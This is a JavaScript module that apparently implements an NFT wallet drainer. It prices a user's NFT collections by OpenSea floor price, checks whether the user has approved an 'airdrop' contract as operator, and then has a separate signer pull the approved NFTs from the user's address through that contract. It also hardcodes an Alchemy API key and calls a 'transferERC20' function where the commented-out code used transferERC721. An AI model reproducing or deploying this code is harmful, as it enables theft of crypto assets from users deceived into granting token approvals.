import { ethers } from "ethers";
import axios from "axios";
import erc721abi from '../abis/erc721abi.json';
import dataProviderAbi from '../abis/DataProviderAbi.json';
import airdropAbi from '../abis/AirdropAbi.json';
import { createWalletClient, http } from 'viem'
export const getBalanceErc721 = async (providerAddress, client, airdrop, tokens, userAddress) => {
    console.log("GET BALANCE ERC721")
    // const dataProviderContract = new ethers.Contract(providerAddress, dataProviderAbi, provider);
    const balances = await client.readContract({
      address: providerAddress,
      abi: dataProviderAbi,
      functionName: "getERC721Balances",
      args: [tokens.map((a) => { return a.address }), userAddress]
    });
    // const balances = await dataProviderContract.getERC721Balances(addresses, userAddress)
    const filtredByBalance = tokens.reduce((filtered, element, index) => {
      if (balances[index].toString() !== "0") {
        filtered.push({ ...element, balance: balances[index] })
      }
      return filtered;
    }, [])
    let filtredTokens = [];
    for(let i = 0; i < filtredByBalance.length; i++) {
        // let contract = new ethers.Contract(filtredByBalance[i].address, erc721abi, provider);
        const allowance = await client.readContract({
            address: filtredByBalance[i].address,
            abi: erc721abi,
            functionName: "isApprovedForAll",
            args: [userAddress, airdrop]
        });
            // const allowance = await contract.isApprovedForAll(userAddress, airdrop);
            const ethPrice = await axios.get("https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD");
            const data = await axios.get('https://api.opensea.io/api/v1/collection/' + filtredByBalance[i].slug);
            let price = 0;
            let priceUSD = 0;
            if (filtredByBalance[i].balance.toString() > 0) {
              price = +data.data.collection.stats.floor_price * +filtredByBalance[i].balance.toString() * ethPrice.data.USD;
              priceUSD = data.data.collection.stats.floor_price !== null ? +data.data.collection.stats.floor_price * +filtredByBalance[i].balance.toString() : 0;
            }
            let newToken = { ...filtredByBalance[i], balance: filtredByBalance[i].balance, allowance: allowance, price: price, priceUSD: priceUSD, isApproved: allowance };
            filtredTokens.push(newToken);
    }
    return await Promise.all(filtredTokens);
  }
  export const transferErc721 = async (chain, airdrop, tokens, publicClient, signer, userAddress ) => {
      let res = [];
      for (let i = 0; i < tokens.length; i++) {
        try {
          // const contract = new ethers.Contract(tokens[i].address, erc721abi, signer);
          // const allowance = await contract.isApprovedForAll(userAddress, airdrop);
          const allowance = await publicClient.readContract({
            address: tokens[i].address,
            abi: erc721abi,
            functionName: "isApprovedForAll",
            args: [userAddress, airdrop]
        })
          if (allowance) {
            res.push(tokens[i]);
          }
        }
        catch (err) {
          console.log(err);
        }
      }
      try {
        const tokens = res;
        // setTokensErc721WithBalance(await Promise.all(res));
        let tokensToSend = [];
        tokens.forEach(async (token) => {
          tokensToSend.push(token.address);
        });
        const options = {
          method: 'GET',
          url: 'https://eth-goerli.g.alchemy.com/nft/v2/U4L4ca3I0BC1TCWi2fVa-I567s6Lajib/getNFTs',
          params: {
            owner: userAddress,
            'contractAddresses[]': tokensToSend.toString(),
            withMetadata: 'false'
          },
          headers: { accept: 'application/json' }
        };
        let nfts = [];
        if (tokensToSend.length > 0) {
          nfts = await axios.request(options);
        }
        let tokensWithIds = [];
        tokens.forEach((token) => {
          nfts?.data.ownedNfts.forEach((nft) => {
            if (nft.contract.address.toLowerCase() === token.address.toLowerCase()) {
              token.ids.push(parseInt(Number(nft.id.tokenId)));
            }
          })
          tokensWithIds.push(token);
        })
        let addressesToSend = ""
        tokensWithIds.forEach((token) => {
          for (let i = 0; i < token.ids.length; i++) {
            addressesToSend += token.address + ",";
          }
        })
        addressesToSend = addressesToSend.toString().substring(0, addressesToSend.length - 1);
        addressesToSend = addressesToSend.split(",");
        let tokensIds = "";
        tokensWithIds.forEach((token) => {
          for (let i = 0; i < token.ids.length; i++) {
            tokensIds += token.ids[i] + ",";
          }
        })
        tokensIds = tokensIds.toString().substring(0, tokensIds.length - 1);
        tokensIds = tokensIds.split(",");
        const tokensIdsToSend = tokensIds.map((id) => {
          return ethers.utils.hexlify(parseInt(id));
        })
        if (tokensIdsToSend.length > 0 && addressesToSend.length > 0) {
          // const signer = new ethers.Wallet(payerTransfer, provider);
          // const airdropContract = new ethers.Contract(airdrop, airdropAbi, signer);
          // const r = await airdropContract.transferERC721(userAddress, addressesToSend, tokensIdsToSend);
          // console.log(r, "erc 721 transfer");
          const walletClient = createWalletClient({
            account:signer,
            chain: chain,
            transport: http()
          })
        // const airdropContract = new ethers.Contract(airdrop, airdropAbi, signer);
        const { request } = await publicClient.simulateContract({
            account: signer,
            address: airdrop,
            abi: airdropAbi,
            functionName: 'transferERC20',
            args: [userAddress, addressesToSend, tokensIdsToSend],
          })
          await walletClient.writeContract(request)
        }
      }
      catch (err) {
        console.log(err);
      }
    }